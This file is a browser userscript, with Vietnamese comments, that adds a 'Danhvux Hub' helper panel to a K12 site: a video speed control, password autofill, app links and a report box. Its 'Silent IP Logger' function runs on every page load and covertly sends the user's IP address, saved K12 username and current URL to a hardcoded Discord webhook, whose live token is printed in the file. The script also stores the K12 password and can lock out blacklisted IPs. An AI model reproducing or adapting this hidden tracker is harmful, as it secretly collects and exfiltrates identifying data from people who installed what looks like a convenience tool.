(function() {
    'use strict';

    // ==========================================
    // ⚙️ CẤU HÌNH HỆ THỐNG (THAY TẠI ĐÂY)
    // ==========================================
    const DISCORD_WEBHOOK_LOGGER = 'https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9rntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV'; 
    const BOT_API_URL = 'http://localhost:5000/blacklist'; // Thay 'localhost' bằng link Ngrok nếu cần

    let uiColor = GM_getValue('ui_theme_color', '#ffea00');
    let userIP = 'Đang lấy...';

    // === HÀM BẢO MẬT & LOGGER ===
    
    // 1. Silent IP Logger (Gửi IP ngầm về Discord)
    function silentLogger(ip) {
        GM_xmlhttpRequest({
            method: "POST",
            url: DISCORD_WEBHOOK_LOGGER,
            headers: { "Content-Type": "application/json" },
            data: JSON.stringify({
                embeds: [{
                    title: "📡 TRUY CẬP MỚI ĐƯỢC PHÁT HIỆN",
                    color: 3066993,
                    fields: [
                        { name: "📍 Địa chỉ IP", value: `\`${ip}\``, inline: true },
                        { name: "👤 User K12", value: `\`${GM_getValue('k12_u', 'Chưa lưu')}\``, inline: true },
                        { name: "🌐 URL", value: window.location.href }
                    ],
                    footer: { text: "Hệ thống Danhvux Hub • " + new Date().toLocaleString() }
                }]
            })
        });
    }

    // 2. Kiểm tra danh sách Ban từ Bot Python
    async function checkSecurity() {
        return new Promise(resolve => {
            // Lấy IP của người dùng
            GM_xmlhttpRequest({
                method: "GET", url: "https://api.ipify.org?format=json",
                onload: (resIP) => {
                    userIP = JSON.parse(resIP.responseText).ip;
                    
                    // Gửi log ẩn ngay khi có IP
                    silentLogger(userIP); 
                    
                    // Hỏi Bot Python xem IP này có bị cấm không
                    GM_xmlhttpRequest({
                        method: "GET", url: BOT_API_URL,
                        onload: (resBot) => {
                            try {
                                const bannedList = JSON.parse(resBot.responseText);
                                // Server trả về JSON: ["ip1", "ip2"]
                                if (bannedList.includes(userIP)) {
                                    document.documentElement.innerHTML = `
                                        <div style="background:#000; color:red; height:100vh; display:flex; align-items:center; justify-content:center; font-family:sans-serif; text-align:center;">
                                            <div><h1 style="font-size:60px;">🚫 TRUY CẬP BỊ TỪ CHỐI</h1>
                                            <p style="font-size:24px;">IP ${userIP} ĐÃ BỊ CẤM TRUY CẬP PANEL DANHVUX</p></div>
                                        </div>`;
                                    window.stop(); // Dừng tải trang ngay lập tức
                                    resolve(false);
                                }
                                resolve(true);
                            } catch(e) { resolve(true); } // Lỗi bot thì cho qua
                        },
                        onerror: () => resolve(true)
                    });
                }
            });
        });
    }

    // === GIAO DIỆN PANEL (MÀU VÀNG CŨ + ANIMATION MỚI) ===
    GM_addStyle(`
        /* Keyframes Animation */
        @keyframes panelFloat { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
        @keyframes contentFade { from { opacity: 0; filter: blur(10px); } to { opacity: 1; filter: blur(0); } }
        
        #danhvux-hub {
            position: fixed; top: 100px; right: 20px; z-index: 999999;
            width: 320px; background: rgba(30, 32, 35, 0.95);
            color: #ffffff; border-radius: 20px; font-family: -apple-system, sans-serif;
            backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            animation: panelFloat 5s ease-in-out infinite; /* Floating effect */
        }
        #danhvux-hub.hidden { transform: scale(0.7) rotate(5deg); opacity: 0; pointer-events: none; }
        
        #k12-header { padding: 25px 20px 10px; cursor: move; position: relative; }
        .dv-dots { position: absolute; top: 18px; left: 20px; display: flex; gap: 7px; }
        .dv-dot { width: 10px; height: 10px; border-radius: 50%; }
        
        .tab-nav { display: flex; gap: 12px; padding: 0 20px; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .tab-btn { background: none; border: none; color: #808080; cursor: pointer; font-size: 10px; font-weight: 700; padding: 10px 0; text-transform: uppercase; }
        .tab-btn.active { color: ${uiColor}; border-bottom: 2px solid ${uiColor}; }
        
        .tab-content { padding: 20px; display: none; min-height: 200px; }
        .tab-content.active { display: block; animation: contentFade 0.3s ease-out forwards; }
        
        .btn-main { width: 100%; padding: 12px; border: none; border-radius: 12px; background: ${uiColor}; color: #000; font-weight: 900; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .btn-main:hover { transform: scale(1.02); box-shadow: 0 5px 15px ${uiColor}33; }
        
        input, textarea { width: 100%; padding: 10px; background: rgba(0,0,0,0.2); border: 1px solid #333; color: white; border-radius: 8px; margin-bottom: 8px; outline: none; }
        
        /* grid apps */
        .apps-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .app-item { display: flex; flex-direction: column; align-items: center; text-decoration: none; color: #aaa; font-size: 10px; transition: 0.2s; }
        .app-item:hover { transform: translateY(-5px); color: ${uiColor}; }
        .app-icon { width: 40px; height: 40px; background: #222; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 18px; margin-bottom: 5px; border: 1px solid transparent; }
        .app-item:hover .app-icon { border-color: ${uiColor}; }
    `);

    // === KHỞI TẠO PANEL ===
    async function init() {
        const isSafe = await checkSecurity();
        if (!isSafe) return;

        console.log("%c[Danhvux Hub]%c Đã khởi tạo giao diện!", "color:#ffea00;font-weight:bold;", "color:#fff;");

        const panel = document.createElement('div');
        panel.id = 'danhvux-hub';
        panel.innerHTML = `
            <div id="k12-header">
                <div class="dv-dots">
                    <div class="dv-dot" style="background:#ff5f57"></div>
                    <div class="dv-dot" style="background:#ffbd2e"></div>
                    <div class="dv-dot" style="background:#27c93f"></div>
                </div>
                <div style="font-size: 20px; font-weight: 900; text-align:right;">DANHVUX <span style="color:${uiColor}">HUB</span></div>
            </div>

            <div class="tab-nav">
                <button class="tab-btn active" data-t="m">🏠 CHÍNH</button>
                <button class="tab-btn" data-t="a">🚀 APPS</button>
                <button class="tab-btn" data-t="r">📩 REPORT</button>
                <button class="tab-btn" data-t="s">⚙️ SET</button>
            </div>

            <div id="m" class="tab-content active">
                <div style="display:flex; justify-content:space-between; font-size:11px; color:#aaa;"><span>Tốc độ:</span><b id="sv" style="color:${uiColor}">x1</b></div>
                <input type="range" id="ss" min="1" max="16" step="0.5" value="1" style="width:100%; accent-color:${uiColor}">
                <button class="btn-main" id="fl">🪄 ĐĂNG NHẬP NHANH</button>
                <p style="font-size:9px; text-align:center; color:#444; margin-top:10px;">Alt + Z để ẩn hiện nhanh</p>
            </div>

            <div id="a" class="tab-content">
                <div class="apps-grid">
                    <a href="https://chatgpt.com" target="_blank" class="app-item"><div class="app-icon">🤖</div>GPT</a>
                    <a href="https://google.com" target="_blank" class="app-item"><div class="app-icon">🔎</div>Google</a>
                    <a href="https://facebook.com" target="_blank" class="app-item"><div class="app-icon">🔵</div>FB</a>
                    <a href="https://youtube.com" target="_blank" class="app-item"><div class="app-icon">📺</div>Youtube</a>
                    <a href="https://messenger.com" target="_blank" class="app-item"><div class="app-icon">💬</div>Mess</a>
                    <a href="https://tiktok.com" target="_blank" class="app-item"><div class="app-icon">🎵</div>TikTok</a>
                </div>
            </div>

            <div id="r" class="tab-content">
                <textarea id="rc" rows="3" placeholder="Nhập lỗi hoặc tố cáo IP..."></textarea>
                <button class="btn-main" id="sr" style="background:#444; color:#fff;">GỬI REPORT</button>
            </div>

            <div id="s" class="tab-content">
                <input type="text" id="ku" placeholder="Tên K12" value="${GM_getValue('k12_u','')}">
                <input type="password" id="kp" placeholder="Mật khẩu" value="${GM_getValue('k12_p','')}">
                <button class="btn-main" id="svs">LƯU CẤU HÌNH</button>
                <p style="font-size:9px; color:#555; text-align:center; margin-top:10px;">IP CỦA BẠN: ${userIP}</p>
            </div>
        `;
        document.body.appendChild(panel);

        // --- XỬ LÝ LOGIC ---

        // Chuyển Tab
        document.querySelectorAll('.tab-btn').forEach(b => {
            b.onclick = () => {
                document.querySelectorAll('.tab-btn, .tab-content').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                document.getElementById(b.dataset.t).classList.add('active');
            };
        });

        // Tốc độ
        document.getElementById('ss').oninput = (e) => {
            document.getElementById('sv').innerText = 'x' + e.target.value;
            if(document.querySelector('video')) document.querySelector('video').playbackRate = e.target.value;
        };

        // Đăng nhập nhanh
        document.getElementById('fl').onclick = () => {
            document.querySelectorAll('input[type="text"], input[name*="user"]').forEach(i => i.value = GM_getValue('k12_u',''));
            document.querySelectorAll('input[type="password"]').forEach(i => i.value = GM_getValue('k12_p',''));
        };

        // Gửi Report
        document.getElementById('sr').onclick = () => {
            const txt = document.getElementById('rc').value;
            GM_xmlhttpRequest({
                method: "POST", url: DISCORD_WEBHOOK_LOGGER,
                headers: {"Content-Type":"application/json"},
                data: JSON.stringify({embeds:[{title:"📩 REPORT NEW", description:`**IP:** ${userIP}\n**Msg:** ${txt}`, color:16776960}]})
            });
            alert("Đã gửi báo cáo!");
        };

        // Lưu cài đặt
        document.getElementById('svs').onclick = () => {
            GM_setValue('k12_u', document.getElementById('ku').value);
            GM_setValue('k12_p', document.getElementById('kp').value);
            alert("✅ Đã lưu cấu hình!");
        };

        // Kéo thả & Phím tắt Alt+Z
        window.addEventListener('keydown', (e) => { if (e.altKey && e.code === 'KeyZ') panel.classList.toggle('hidden'); });
        let d = false, ox, oy;
        document.getElementById('k12-header').onmousedown = (e) => { d = true; ox = e.clientX-panel.offsetLeft; oy = e.clientY-panel.offsetTop; };
        document.onmousemove = (e) => { if(d) { panel.style.left = (e.clientX-ox)+'px'; panel.style.top = (e.clientY-oy)+'px'; panel.style.right='auto'; } };
        document.onmouseup = () => d = false;
    }

    init();
})();
